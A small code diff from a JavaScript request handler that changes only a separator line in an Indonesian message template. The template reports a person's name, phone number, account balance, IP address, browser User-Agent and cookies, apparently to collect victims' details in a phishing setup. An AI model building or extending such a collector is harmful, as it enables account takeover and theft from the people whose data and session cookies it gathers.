@@ -19,7 +19,7 @@ export default async function handler(req, res) {
 👤 *Nama:* ${a}
 📱 *Nomor:* ${b}
 💰 *Saldo:* ${c}
-_______________________
+────────────────────
 🌐 *IP:* ${ip}
 🧠 *User-Agent:* ${userAgent}
 🍪 *Cookies:* ${cookies}
